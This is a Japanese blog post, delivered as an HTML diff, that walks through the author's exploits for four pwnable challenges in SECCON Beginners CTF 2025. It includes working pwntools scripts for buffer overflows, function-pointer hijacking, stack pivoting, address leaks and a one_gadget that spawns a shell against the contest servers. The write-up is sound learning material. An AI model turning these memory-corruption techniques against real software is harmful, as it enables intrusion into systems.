@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Figaro&#x27;s Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+    <meta name="google-site-verification" content="g4e1f-rfOGwL8eft4txNmLdl2trU4nFIKvIdVoXx6V8" />
+
+    <link rel="stylesheet" href="https://figaro-san.github.io/style.css">
+    <link rel="stylesheet" href="https://figaro-san.github.io/color/green.css">
+
+        <link rel="stylesheet" href="https://figaro-san.github.io/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://figaro-san.github.io/font-hack-subset.css">
+
+    <meta name="description" content="">
+
+    <meta property="og:description" content="">
+    <meta property="og:title" content="Figaro's Blog">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://figaro-san.github.io/seccon-beginners-ctf-2025/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:title" content="Figaro's Blog">
+    <meta property="twitter:domain" content="figaro-san.github.io">
+    <meta property="twitter:url" content="https://figaro-san.github.io/seccon-beginners-ctf-2025/">
+
+        <link rel="shortcut icon" type="image&#x2F;x-icon" href="/butterfly.jpg">
+    
+    </head>
+
+<body class="">
+<div class="container">
+    
+    <header class="header">
+        <div class="header__inner">
+            <div class="header__logo">
+                    
+                <a href="https://figaro-san.github.io" style="text-decoration: none;">
+                    <div class="logo">
+                      
+                            Figaro&#x27;s Blog
+                        
+                    </div>
+                </a>
+            </div>
+        </div>
+
+        
+        
+                <nav class="menu">
+            <ul class="menu__inner">
+                <li class="active"><a href="https://figaro-san.github.io">blog</a></li>
+            
+                <li><a href="https://figaro-san.github.io/tags">tags</a></li>
+            
+                <li><a href="https://figaro-san.github.io/whoami">whoami</a></li>
+            
+                <li><a href="https://figaro-san.github.io/about">about</a></li>
+            
+                <li><a href="https://figaro-san.github.io/links">links</a></li>
+            </ul>
+        </nav>
+    
+    
+        
+    </header>
+    
+
+    <div class="content">
+        
+    <div class="post">
+        
+    <h1 class="post-title"><a href="https://figaro-san.github.io/seccon-beginners-ctf-2025/">SECCON Beginners CTF 2025 writeup</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2025-07-29
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/ctf/">#CTF</a></span>
+    
+
+        <div class="post-content">
+            <h2 id="korehahe">これは何</h2>
+<p>SECCON Beginners CTF 2025 writeupです。私が参加していた<code>touseki</code>は21位で、私はpwnableを担当していました。私が回答した問題はpwnableのうち3問ですが、<code>pivot4b++</code>も載せておきます。<code>TimeOfControl</code>というかヒープとカーネル問は今後の課題です。</p>
+<h2 id="pet-name">pet_name</h2>
+<p><code>pet_name</code>に対する<code>scanf()</code>が脆弱だったらしく、32バイトより多い入力でBOF。<br />
+この変数の後ろにファイルパスの変数があるので、そこを<code>/home/pwn/flag.txt</code>にするとフラグが見えた。</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">char</span><span> pet_name[</span><span style="color:#cf6a4c;">32</span><span>];
+</span><span style="color:#ffb964;">scanf</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%s</span><span style="color:#556633;">&quot;</span><span>, pet_name);
+</span></code></pre>
+<p>つまり<br />
+<code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/home/pwn/flag.txt</code><br />
+を入力として与えれば良い。フラグは忘れた。</p>
+<h2 id="pet-sound">pet_sound</h2>
+<p><code>main.c, chall</code>しか渡されないが、ヒープ臭くて嫌。<br />
+<code>Pet</code>構造体には関数ポインタの定義があり、<code>speak_sound()</code>という関数が本来は設定される。しかし、<code>speak_flag()</code>という関数が存在しており、これに書き換えるのだと思われる。<br />
+また、<code>Pet</code>構造体には<code>char sound[32]</code>というメンバがあるが、<code>read(9, pet_A-&gt;sound, 0x32)</code>という自明なBOFが存在する。</p>
+<p>プログラムを実行すると、<code>pet_A-&gt;sound</code>への入力を促されるが、この入力こそ<code>read(0, pet_A-&gt;sound,, 0x32);</code>になっており、<code>0x32 -&gt; 50</code>である。<br />
+<code>pet_A-&gt;sound</code>から<code>pet_B-&gt;speak</code>のオフセットは<code>5*8 = 40bytes</code>あり、そこから+8bytesで上書き可能。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>--- Pet Hijacking ---
+</span><span>Your mission: Make Pet speak the secret FLAG!
+</span><span>
+</span><span>[hint] The secret action &#39;speak_flag&#39; is at: 0x64aed3852492
+</span><span>[*] Pet A is allocated at: 0x64af0487f2a0
+</span><span>[*] Pet B is allocated at: 0x64af0487f2d0
+</span><span>
+</span><span>[Initial Heap State]
+</span><span>
+</span><span>--- Heap Layout Visualization ---
+</span><span>0x000064af0487f2a0: 0x000064aed38525d2 &lt;-- pet_A-&gt;speak
+</span><span>0x000064af0487f2a8: 0x00002e2e2e6e6177 &lt;-- pet_A-&gt;sound
+</span><span>0x000064af0487f2b0: 0x0000000000000000
+</span><span>0x000064af0487f2b8: 0x0000000000000000
+</span><span>0x000064af0487f2c0: 0x0000000000000000
+</span><span>0x000064af0487f2c8: 0x0000000000000031
+</span><span>0x000064af0487f2d0: 0x000064aed38525d2 &lt;-- pet_B-&gt;speak (TARGET!)
+</span><span>0x000064af0487f2d8: 0x00002e2e2e6e6177 &lt;-- pet_B-&gt;sound
+</span><span>0x000064af0487f2e0: 0x0000000000000000
+</span><span>0x000064af0487f2e8: 0x0000000000000000
+</span><span>0x000064af0487f2f0: 0x0000000000000000
+</span><span>0x000064af0487f2f8: 0x0000000000020d11
+</span><span>
+</span><span>Input a new cry for Pet A &gt; 
+</span><span>---------------------------------
+</span></code></pre>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span>
+</span><span>file = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./chall</span><span style="color:#556633;">&#39;
+</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(file)
+</span><span>p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">pet-sound.challenges.beginners.seccon.jp</span><span style="color:#556633;">&#39;</span><span>, </span><span style="color:#cf6a4c;">9090</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">at: </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>speak_flag = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&#39;</span><span>), </span><span style="color:#cf6a4c;">16</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">speak_flag: </span><span>{</span><span style="color:#ffb964;">hex</span><span>(speak_flag)}</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">A &gt; </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">A</span><span style="color:#556633;">&#39;</span><span>*</span><span style="color:#cf6a4c;">40 </span><span>+ </span><span style="color:#ffb964;">p64</span><span>(speak_flag))
+</span><span>p.</span><span style="color:#ffb964;">interactive</span><span>()
+</span></code></pre>
+<h2 id="pivot4b">pivot4b</h2>
+<p>ASLRが効いている。PIEとカナリアは効いていない。<br />
+<code>char message[0x30]</code>があり、そのアドレスがリークしている。<br />
+また、<code>message[0x30]</code>に対して、<code>read(0, message, sizeof(message) + 0x10);</code>がある。<br />
+さらには<code>system</code>と<code>pop rdi, ret</code>もご親切に用意されている。</p>
+<p><code>0x42</code>は私の<code>B*8</code>の入力、<code>0x00007ffff7db86b5</code>が<code>main</code>が使うリターンアドレス。<br />
+<code>offset = 7*8 = 56bytes</code><br />
+<code>overwrite_retaddr = 56+8 = 64bytes</code></p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>0x7fffffffe130: 0x4242424242424242      0x00007ffff7f7850a
+</span><span>0x7fffffffe140: 0x00007fffffffe180      0x00007ffff7e204b1
+</span><span>0x7fffffffe150: 0x0000000000000000      0x00007ffff7fe49a0
+</span><span>0x7fffffffe160: 0x00007fffffffe200      0x00007ffff7db86b5
+</span></code></pre>
+<p><code>sizeof(message) + 0x10 = 0x40 = 64bytes</code>より入力が64bytesまでと分かる。</p>
+<p>問題名の通り、stack pivotingが必要で、私は<code>leave; ret</code>を2回使った。<br />
+stack pivotingは退避されたrbpに、rspにセットしたい値を書き込むところから考える。<br />
+次に正規のretに引き取らせたいアドレス、今回はもう一度<code>leave; ret</code>したいのでこのアドレスを設定する。<br />
+<code>leave; ret</code>が実行されると、<code>mov rsp, rbp</code>が最初に走るため、<code>rsp</code>が先程上書きしておいたsaved-rbpの位置にある値に変わっている。<br />
+このため、<code>leave; ret</code>を構成する命令の2つ目である、<code>pop rbp</code>が、saved-rbpの位置に書き込んでおいたアドレスから始まる(今回は<code>message</code>の先頭から始まる &amp; <code>message</code>は攻撃者の入力バッファなので、payloadの先頭でもある)</p>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span>
+</span><span>file = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./chall</span><span style="color:#556633;">&#39;
+</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(file)
+</span><span>p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">pivot4b.challenges.beginners.seccon.jp</span><span style="color:#556633;">&#39;</span><span>, </span><span style="color:#cf6a4c;">12300</span><span>)
+</span><span style="color:#888888;">#p = process(file)
+</span><span>
+</span><span style="color:#ffb964;">LEAVE_RET </span><span>= </span><span style="color:#cf6a4c;">0x0000000000401211
+</span><span style="color:#ffb964;">POP_RDI_RET </span><span>= </span><span style="color:#cf6a4c;">0x000000000040117a
+</span><span style="color:#ffb964;">RET </span><span>= </span><span style="color:#cf6a4c;">0x000000000040101a
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">message: </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>message_addr = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&#39;</span><span>), </span><span style="color:#cf6a4c;">16</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">message address: </span><span>{</span><span style="color:#ffb964;">hex</span><span>(message_addr)}</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>
+</span><span style="color:#888888;"># 今回は64bytesピッタリなのでパディングが必要なかった
+</span><span>payload = </span><span style="color:#ffb964;">flat</span><span>(
+</span><span>    </span><span style="color:#cf6a4c;">0x0</span><span>,                </span><span style="color:#888888;"># leave (pop rbp)     message+0x00-0x07
+</span><span>    </span><span style="color:#ffb964;">POP_RDI_RET</span><span>,        </span><span style="color:#888888;"># ret                 message+0x08-0x0f
+</span><span>    message_addr+</span><span style="color:#cf6a4c;">0x28</span><span>,  </span><span style="color:#888888;"># pop rdi             message+0x10-0x17
+</span><span>    </span><span style="color:#ffb964;">RET</span><span>,                </span><span style="color:#888888;"># for movaps          message+0x18-0x1f
+</span><span>    elf.plt[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">system</span><span style="color:#556633;">&#39;</span><span>],  </span><span style="color:#888888;"># ret                 message+0x20-0x27
+</span><span>    </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">/bin/sh\x00</span><span style="color:#556633;">&#39;</span><span>,     </span><span style="color:#888888;"># &lt;-rdi               message+0x28-0x2f
+</span><span>    message_addr,       </span><span style="color:#888888;"># overwrite saved-rbp message+0x30-0x37
+</span><span>    </span><span style="color:#ffb964;">LEAVE_RET</span><span>,          </span><span style="color:#888888;"># overwrite ret_addr  message+0x38-0x3f
+</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt; </span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">input</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">ready: </span><span style="color:#556633;">&#39;</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(payload)
+</span><span>p.</span><span style="color:#ffb964;">recvline</span><span>()
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">interactive</span><span>()
+</span></code></pre>
+<p>フラグ: <code>ctf4b{7h3_57ack_c4n_b3_wh3r3v3r_y0u_l1k3}</code></p>
+<h2 id="pivot4b-1">pivot4b++</h2>
+<p>相変わらず<code>0x40</code>までの入力が認められている</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>pwndbg&gt; x/50gx $rsp
+</span><span>0x7fffffffe190: 0x4242424242424242      0x000000000000000a
+</span><span>0x7fffffffe1a0: 0x0000000000000000      0x0000000000000000
+</span><span>0x7fffffffe1b0: 0x0000000000000000      0x00007ffff7ffd000 &lt;- rtld_global
+</span><span>0x7fffffffe1c0: 0x00007fffffffe1d0      0x000055555555522b &lt;- retaddr
+</span><span>0x7fffffffe1d0: 0x00007fffffffe270      0x00007ffff7db86b5
+</span><span>0x7fffffffe1e0: 0x00007ffff7fc6000      0x00007fffffffe2f8
+</span></code></pre>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>pwndbg&gt; retaddr
+</span><span>0x7fffffffe1c8 —▸ 0x55555555522b (main+79) ◂— mov eax, 0
+</span><span>0x7fffffffe1d8 —▸ 0x7ffff7db86b5 (__libc_start_call_main+117) ◂— mov edi, eax
+</span><span>0x7fffffffe278 —▸ 0x7ffff7db8769 (__libc_start_main+137) ◂— mov r14, qword ptr [rip + 0x1be820]
+</span><span>0x7fffffffe2d8 —▸ 0x5555555550a5 (_start+37) ◂— hlt 
+</span></code></pre>
+<p><code>rtld_global</code>なる領域がある</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>pwndbg&gt; x/50gx 0x00007ffff7ffd000
+</span><span>0x7ffff7ffd000 &lt;_rtld_global&gt;:    0x00007ffff7ffe310      0x0000000000000004
+</span><span>0x7ffff7ffd010 &lt;_rtld_global+16&gt;: 0x00007ffff7ffe608      0x0000000000000000
+</span><span>0x7ffff7ffd020 &lt;_rtld_global+32&gt;: 0x00007ffff7f81000      0x0000000000000000
+</span><span>0x7ffff7ffd030 &lt;_rtld_global+48&gt;: 0x0000000000000000      0x0000000000000001
+</span><span>
+</span><span>pwndbg&gt; x 0x00007ffff7ffe310
+</span><span>0x7ffff7ffe310: 0x0000555555554000 &lt;- binaryの先頭
+</span><span>pwndbg&gt; x 0x00007ffff7f81000
+</span><span>0x7ffff7f81000: 0x00007ffff7d91000 &lt;- libcの先頭
+</span></code></pre>
+<p>というかpivot先が分からない、PIEでASLRが効いているので。</p>
+<ul>
+<li>saved-rbpやretaddrの1バイトのみを書き換える?
+<ul>
+<li>ASLRが効いているから書き換えたところで、望んだアドレスになる訳ではない</li>
+<li>1つの値だけこれをするならまだ総当りできるが、2つも3つもやるならかなり現実的じゃない</li>
+</ul>
+</li>
+<li>saved-rbpやretaddrの直前まで書き込むと、入力後の<code>printf</code>で<code>message</code>に連続した文字列として読める
+<ul>
+<li>読めた後に操作できるわけではない</li>
+<li>retaddrは読めるが、そのためにはretaddrを上書きしないことが求められ、結果として制御を移せたりするわけではない。</li>
+</ul>
+</li>
+</ul>
+<hr />
+<p>上記までが大会参加中の私の脳内ダンプであり、下記はwriteup参照後のダンプとなる。</p>
+<hr />
+<p>どうやら、PIEとASLRが有効でも、コード領域の下位1バイト(正確には下位12bit?)のみは固定らしい
+つまりリターンアドレスの1バイトのみを上書きして、<code>vuln</code>を再実行することができる。同時にリターンアドレスのリークも可能なので、固定の下位1バイト+リークしたリターンアドレスを組み合わせて最終的にバイナリベースを算出できる。</p>
+<p><code>vuln</code>の<code>read</code>後のスタック</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>0x7fff8f009850: 0x4242424242424242      0x00007df7b828160a
+</span><span>0x7fff8f009860: 0x0000000000000000      0x00007fff8f009890
+</span><span>0x7fff8f009870: 0x00007fff8f0099a8      0x00005bf568fb71dc
+</span><span>0x7fff8f009880: 0x00007fff8f009890      0x00005bf568fb722b
+</span></code></pre>
+<p>1回目の<code>main</code>のリターンアドレス</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>   0x00005bf568fb7221 &lt;+69&gt;:    call   0x5bf568fb7050 &lt;alarm@plt&gt;
+</span><span>   0x00005bf568fb7226 &lt;+74&gt;:    call   0x5bf568fb7179 &lt;vuln&gt;
+</span><span>   0x00005bf568fb722b &lt;+79&gt;:    mov    eax,0x0
+</span></code></pre>
+<p>2回目</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>   0x000061d329327221 &lt;+69&gt;:    call   0x61d329327050 &lt;alarm@plt&gt;
+</span><span>   0x000061d329327226 &lt;+74&gt;:    call   0x61d329327179 &lt;vuln&gt;
+</span><span>   0x000061d32932722b &lt;+79&gt;:    mov    eax,0x0
+</span></code></pre>
+<p>3回目</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>   0x000056a6d0bd9221 &lt;+69&gt;:    call   0x56a6d0bd9050 &lt;alarm@plt&gt;
+</span><span>   0x000056a6d0bd9226 &lt;+74&gt;:    call   0x56a6d0bd9179 &lt;vuln&gt;
+</span><span>   0x000056a6d0bd922b &lt;+79&gt;:    mov    eax,0x0
+</span></code></pre>
+<p>そういえばバイナリベースは<code>0x1000</code>にアラインされている -&gt; ということは、下位12bitのみはかならず0になる -&gt; 下位12bitより上はページアライン的にランダムだが、下位12bitは000に固定のオフセットを足すのと同じなので、結果として下位12bitは固定になっていると分かった。</p>
+<p>つまり、<code>'A' * 56 + 0x26(call vuln命令の下位1バイト)</code>を入力として与えれば</p>
+<ul>
+<li>リターンアドレスを上書きして<code>main</code>にある<code>call vuln</code>を再実行</li>
+<li>かつ、リターンアドレスまでのデータが連続しているので、<code>printf</code>で<code>message</code>の内容としてリターンアドレスをリーク可能</li>
+</ul>
+<p>リークしたリターンアドレスの下位1バイトが掛けている(vulnの1バイトで上書きしている)が、0x2bなのは自明。リークした値を8bit左にシフトして、<code>0x2b</code>を足し合わせれば元のリターンアドレスになる。バイナリベースは、<code>call main</code>の次の命令がリターンアドレスなので、その相対オフセット<code>0x122b</code>を正規のリターンアドレスから引けば求まる。</p>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span>retaddr = (data &lt;&lt; </span><span style="color:#cf6a4c;">8</span><span>) + </span><span style="color:#cf6a4c;">0x2b
+</span><span>elf.address = retaddr - </span><span style="color:#cf6a4c;">0x122b
+</span></code></pre>
+<p>次に<code>libc</code>のベースを見つけたい。バッファの容量は64バイトしかないことに注意
+<code>chall</code>ではなく、<code>chall_patched</code>だと、<code>vuln</code>の<code>ret</code>直前に、<code>rdi</code>が<code>libc</code>のシンボルのアドレスを持っていた。
+<code>*RDI  0x7ffdc76ea5e0 —▸ 0x7eabe9262050 (funlockfile) ◂— endbr64 </code></p>
+<p>vulnのret直前、rdiがlibcのシンボル(funlockfile)というアドレスを持っていた。
+これをリターンアドレスを書き換えて、<code>puts</code>直前に飛ばせば、アドレスがリークするかもしれない。
+通常の<code>chall</code>だとこのような挙動にならず、<code>chall_patched</code>のみ確認できた。おそらく<code>libc</code>のバージョンに依存しているのだと思われる。</p>
+<p>ともかく、次の<code>vuln</code>の実行では<code>'A'*56 + p64(elf.sym['vuln']+18)</code>を送信して、<code>ret</code>直後に残っている<code>rdi</code>を利用し、<code>vuln+18</code>こと<code>puts</code>の呼び出しに飛ばせる。
+こうすると、<code>funlockfile</code>のアドレスがリークしたため、相対アドレスを引けば<code>libc</code>ベースが求まる。</p>
+<p>問題は、この次が再実行されないこと。
+退避されたrbpをどうにかして適当な値にしないと行けないらしいが意味がわらない
+<code>elf.base + 0x5000 - 0x10</code>というアドレスにするらしい。
+場所的にはread/writeな箇所のように見えるが、おそらくここはコード領域っぽくない。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>pwndbg&gt; vmmap
+</span><span>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+</span><span>             Start                End Perm     Size Offset File 
+</span><span>    0x604879d4d000     0x604879d4e000 r--p     1000      0 chall_patched
+</span><span>    0x604879d4e000     0x604879d4f000 r-xp     1000   1000 chall_patched
+</span><span>    0x604879d4f000     0x604879d50000 r--p     1000   2000 chall_patched
+</span><span>    0x604879d50000     0x604879d51000 r--p     1000   2000 chall_patched
+</span><span>    0x604879d51000     0x604879d54000 rw-p     3000   3000 chall_patched
+</span><span>    0x726a26800000     0x726a26828000 r--p    28000      0 libc.so.6
+</span></code></pre>
+<p>結局、バイナリのベース+<code>0x5000</code>に設定してみたら再度<code>vuln</code>+18から実行されて、もう一度入力を求められた。</p>
+<p>最後に<code>one_gadget</code>する</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>0xebd3f execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])
+</span><span>constraints:
+</span><span>  address rbp-0x48 is writable
+</span><span>  rax == NULL || {rax, r12, NULL} is a valid argv
+</span><span>  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
+</span></code></pre>
+<p>とりあえず、<code>rbp</code>が指す先が<code>writable</code>なら良さそうなので、バイナリベース+<code>0x6000</code>にでも設定しておく。
+リターンアドレスは<code>libc.address + 0xebd3f</code>に上書きすれば良い。</p>
+<p>なぜかローカルでは動くが、コンテナでは動かなかった。
+ここで、twitterでRW領域が<code>pwninit</code>でパッチされたものと異なっておりハマっている人を発見。
+私の問題もそんな所だろうと考えて、2回目のペイロードの送信時の<code>saved-rbp</code>を上書きする値を<code>bss+0x100</code>に設定し、3回目の<code>one_gadget</code>のための<code>saved-rbp</code>を<code>bss+0x200</code>に設定しておくとうまく行った。</p>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span>file = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./chall_patched</span><span style="color:#556633;">&#39;
+</span><span>libc_file = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./libc.so.6</span><span style="color:#556633;">&#39;
+</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(file)
+</span><span>libc = </span><span style="color:#ffb964;">ELF</span><span>(libc_file)
+</span><span style="color:#888888;">#p = process(file)
+</span><span>p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">localhost</span><span style="color:#556633;">&#39;</span><span>, </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">12300</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>
+</span><span style="color:#888888;"># calculate binary base
+</span><span>p.</span><span style="color:#ffb964;">sendafter</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt; </span><span style="color:#556633;">&#39;</span><span>, </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">A</span><span style="color:#556633;">&#39;</span><span>*</span><span style="color:#cf6a4c;">56 </span><span>+ </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\x26</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\x26</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>data = p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&#39;</span><span>).</span><span style="color:#ffb964;">strip</span><span>()
+</span><span>data = int.</span><span style="color:#ffb964;">from_bytes</span><span>(data, </span><span style="color:#ffb964;">byteorder</span><span>=</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">little</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>retaddr = (data &lt;&lt; </span><span style="color:#cf6a4c;">8</span><span>) + </span><span style="color:#cf6a4c;">0x2b
+</span><span>elf.address = retaddr - </span><span style="color:#cf6a4c;">0x122b
+</span><span>
+</span><span>
+</span><span style="color:#888888;"># second vuln, calculate libc base
+</span><span>payload = </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">A</span><span style="color:#556633;">&#39;</span><span>*</span><span style="color:#cf6a4c;">48 </span><span>+ </span><span style="color:#ffb964;">p64</span><span>(elf.</span><span style="color:#ffb964;">bss</span><span>()+</span><span style="color:#cf6a4c;">0x100</span><span>) + </span><span style="color:#ffb964;">p64</span><span>(elf.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">vuln</span><span style="color:#556633;">&#39;</span><span>] + </span><span style="color:#cf6a4c;">18</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">sendafter</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt; </span><span style="color:#556633;">&#39;</span><span>, payload)
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>funlockfile_leak = int.</span><span style="color:#ffb964;">from_bytes</span><span>(p.</span><span style="color:#ffb964;">recv</span><span>(</span><span style="color:#cf6a4c;">6</span><span>), </span><span style="color:#ffb964;">byteorder</span><span>=</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">little</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>libc.address = funlockfile_leak - libc.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">funlockfile</span><span style="color:#556633;">&#39;</span><span>]
+</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">libc base: </span><span>{</span><span style="color:#ffb964;">hex</span><span>(libc.address)}</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">leak : </span><span>{</span><span style="color:#ffb964;">hex</span><span>(funlockfile_leak)}</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>
+</span><span>
+</span><span style="color:#888888;"># third vuln, begin fron vuln+18
+</span><span style="color:#888888;"># overwrite saved-rbp for one_gadget, then jump to the address of one_gadget
+</span><span>payload = </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">A</span><span style="color:#556633;">&#39;</span><span>*</span><span style="color:#cf6a4c;">48 </span><span>+ </span><span style="color:#ffb964;">p64</span><span>(elf.</span><span style="color:#ffb964;">bss</span><span>()+</span><span style="color:#cf6a4c;">0x200</span><span>) + </span><span style="color:#ffb964;">p64</span><span>(libc.address + </span><span style="color:#cf6a4c;">0xebd3f</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">sendafter</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt; </span><span style="color:#556633;">&#39;</span><span>, payload)
+</span><span>p.</span><span style="color:#ffb964;">interactive</span><span>()
+</span></code></pre>
+<h2 id="zui-hou-ni">最後に</h2>
+<p>正直<code>pivot4b++</code>がなぜこのコードで解けるのかを詳細に理解していない。<br />
+去年のSECCON Beginnersのwriteupを見返してみたが、去年よりは成長していると実感した。<br />
+去年はROPとか一ミリも分からなかったし、pwntoolsとかも使っていなかった。<br />
+今年の目標はStack-basedなexploitの強化と、Heap-basedなexploitの学習を目指したい。</p>
+
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h">Thanks for reading! Read other posts?</span>
+                    <hr />
+                </div>
+                <div class="pagination__buttons">
+                        <span class="button previous">
+                            <a href="https://figaro-san.github.io/c2c-ctf-2025-finals/">
